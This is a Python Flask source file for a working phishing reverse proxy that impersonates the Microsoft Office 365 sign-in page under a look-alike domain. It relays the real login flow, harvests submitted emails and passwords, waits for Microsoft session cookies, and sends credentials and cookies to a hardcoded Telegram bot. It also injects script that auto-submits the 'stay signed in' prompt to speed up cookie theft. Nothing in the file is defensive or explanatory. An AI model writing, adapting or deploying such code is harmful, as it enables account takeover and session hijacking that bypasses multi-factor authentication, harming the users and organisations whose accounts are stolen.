import os
import re
import json
import uuid
import requests
from flask import Flask, request, Response, redirect
from urllib.parse import urljoin

app = Flask(__name__)

# --- Config ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

PROXY_DOMAIN = "https://outlook-verify.onrender.com"
UPSTREAM = "https://login.microsoftonline.com"
UPSTREAM_HOST = "login.microsoftonline.com"

# Per-visitor upstream sessions (keeps cookies separate per victim)
visitor_sessions = {}

CAPTURED = {}  # vid -> {"email":..., "password":..., "cookies":...}

# --- Telegram ---
def send_telegram(message):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception as e:
        print(f"[TG ERROR] {e}")

# --- Cookie capture after login ---
def check_and_send(vid):
    info = CAPTURED.get(vid)
    if not info or info.get("sent"):
        return
    # Login is complete when we get the persistent auth cookie
    sess = visitor_sessions.get(vid)
    if not sess:
        return
    cookies = sess.cookies.get_dict()
    if "ESTSAUTHPERSISTENT" in cookies or "ESTSAUTH" in cookies:
        info["sent"] = True
        cookie_str = "\n".join([f"<code>{k}={v}</code>" for k, v in cookies.items()])
        msg = (f"<b>✅ Office 365 Catch</b>\n\n"
               f"<b>Email:</b> <code>{info.get('email','?')}</code>\n"
               f"<b>Password:</b> <code>{info.get('password','?')}</code>\n\n"
               f"<b>Cookies:</b>\n{cookie_str}")
        send_telegram(msg)

# --- URL rewriting helpers ---
def rewrite_html(text):
    # Point all links/assets at our proxy
    text = text.replace(f"https://{UPSTREAM_HOST}", PROXY_DOMAIN)
    text = text.replace("//" + UPSTREAM_HOST, PROXY_DOMAIN.replace("https://", "") and PROXY_DOMAIN)
    text = text.replace(f"'/{UPSTREAM_HOST}", f"'{PROXY_DOMAIN}")
    return text

def rewrite_css(text):
    return text.replace(f"https://{UPSTREAM_HOST}", PROXY_DOMAIN)

# --- Main proxy route ---
@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
@app.route('/<path:path>', methods=['GET', 'POST'])
def proxy(path):
    vid = request.cookies.get('vid')
    if not vid:
        vid = str(uuid.uuid4())
        # Set cookie on first response below

    if vid not in visitor_sessions:
        visitor_sessions[vid] = requests.Session()
        visitor_sessions[vid].headers.update({
            "User-Agent": request.headers.get("User-Agent", "Mozilla/5.0")
        })
    sess = visitor_sessions[vid]

    target = f"{UPSTREAM}/{path}"
    # Forward query string
    if request.query_string:
        target += "?" + request.query_string.decode()

    # Build upstream request
    headers = {}
    for h in ["Accept", "Accept-Language", "Referer", "Content-Type"]:
        if h in request.headers:
            headers[h] = request.headers[h]
    if "Referer" in headers:
        headers["Referer"] = headers["Referer"].replace(PROXY_DOMAIN, UPSTREAM)

    try:
        if request.method == "POST":
            resp = sess.post(target, data=request.form, headers=headers,
                             allow_redirects=False, timeout=20)
        else:
            resp = sess.get(target, headers=headers, allow_redirects=False, timeout=20)
    except Exception as e:
        return f"Proxy error: {e}", 502

    # --- Capture credentials from the login POST ---
    if request.method == "POST":
        passwd = request.form.get("passwd") or request.form.get("Password")
        login = request.form.get("loginfmt") or request.form.get("login") or request.form.get("username")
        if passwd:
            CAPTURED[vid] = {"email": login, "password": passwd, "sent": False}

    # --- Handle redirects (rewrite Location to our domain) ---
    if "Location" in resp.headers:
        loc = resp.headers["Location"]
        loc = loc.replace(UPSTREAM, PROXY_DOMAIN)
        # login.live.com redirects also matter, keep them absolute for now
        resp_cookies = resp.headers.get("Set-Cookie", "")
        r = Response(status=resp.status_code)
        r.headers["Location"] = loc
        if resp_cookies:
            r.headers["Set-Cookie"] = resp_cookies
        if not request.cookies.get('vid'):
            r.set_cookie('vid', vid, max_age=86400)
        check_and_send(vid)
        return r

    # --- Response body ---
    content_type = resp.headers.get("Content-Type", "")
    body = resp.content

    if "text/html" in content_type:
        text = body.decode("utf-8", errors="ignore")
        text = rewrite_html(text)
        # Inject a tiny sniffer to catch 'There was an issue' vs success and help capture
        inject = """
        <script>
        (function(){
          // Force iKMSI / stay-signed-in auto-continue to capture cookies faster
          var f = document.querySelector('form');
          if (f && location.href.indexOf('kmsi') !== -1) {
            var btn = f.querySelector('input[type=submit][value=Yes], button');
            if (btn) { setTimeout(function(){ f.submit(); }, 800); }
          }
        })();
        </script>
        """
        if "</body>" in text:
            text = text.replace("</body>", inject + "</body>")
        body = text.encode("utf-8")
    elif "text/css" in content_type:
        text = body.decode("utf-8", errors="ignore")
        body = rewrite_css(text).encode("utf-8")

    r = Response(body, status=resp.status_code)
    r.headers["Content-Type"] = content_type

    # Pass Set-Cookie headers through
    for k, v in resp.headers.items():
        if k.lower() == "set-cookie":
            r.headers.add("Set-Cookie", v)

    if not request.cookies.get('vid'):
        r.set_cookie('vid', vid, max_age=86400)

    check_and_send(vid)
    return r


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False)
